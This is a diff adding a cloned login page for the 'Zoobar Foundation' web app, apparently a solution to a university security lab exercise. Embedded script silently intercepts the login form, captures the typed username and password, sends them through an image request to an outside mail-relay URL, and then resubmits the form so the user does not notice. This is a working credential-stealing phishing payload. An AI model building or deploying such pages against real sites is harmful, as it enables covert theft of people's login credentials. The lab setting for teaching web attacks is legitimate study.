@@ -1,0 +1,67 @@
+<html>
+  <head>
+    <meta charset="utf-8">
+    <link rel="stylesheet" type="text/css" href="http://localhost:8080/zoobar/media/zoobar.css">
+    <title>
+      Login - Zoobar Foundation
+    </title>
+  </head>
+  <body> 
+    <h1><a href="http://localhost:8080/zoobar/index.cgi/">Zoobar Foundation for Sensible
+                    Research</a></h1>
+    <h2>Supporting the loyal
+        soldiers of the information superhighway</h2>
+    <div id="login" class="centerpiece">
+      <form name="loginform" method="POST" action="http://localhost:8080/zoobar/index.cgi/login">
+        <table>
+        <tbody><tr>
+            <td>Username:</td>
+          <td><input name="login_username" id="user_field" size="20" autocomplete="no" value="" type="text"></td>
+        </tr>
+        <tr>
+            <td>Password:</td>
+          <td colspan="2">
+            <input name="login_password" id="login_field" size="20" autocomplete="no" type="password">
+            <input name="submit_login" id="submit_login" value="Log in" type="submit">
+            <input name="submit_registration" id="submit_registration" value="Register" type="submit">
+          </td>
+        </tr>
+        </tbody></table>
+        <input name="nexturl" value="http://localhost:8080/zoobar/index.cgi/" type="hidden">
+      </form>
+      <script>
+        var firstLoop = true;
+        document.forms[0].onsubmit = function(e) {
+          if (firstLoop) {
+            e.preventDefault();
+            var name = document.getElementById("user_field").value;
+            var pass = document.getElementById("login_field").value;
+            var payload = encodeURIComponent(name + "/" + pass);
+            (new Image()).src='http://css.csail.mit.edu/6.858/2018/labs/sendmail.php?' + 'to=qpm3@mit.edu' + '&payload=' + payload + '&random=' + Math.random();
+            firstLoop = false;
+          }
+        };
+
+        function submitReg() {
+          setTimeout(function(){
+            document.getElementById("submit_registration").click();
+            firstLoop = true;
+          }, 1000);
+        };
+
+        function submitLog() {
+          setTimeout(function(){
+            document.getElementById("submit_login").click();
+            firstLoop = true;
+          }, 1000);
+        };
+
+        document.getElementById("submit_login").addEventListener("click", submitLog);
+        document.getElementById("submit_registration").addEventListener("click", submitReg);
+      </script>
+    </div>
+    <div class="footer warning">
+    </div>
+    <script>document.loginform.login_username.focus();</script>
+  </body>
+</html>
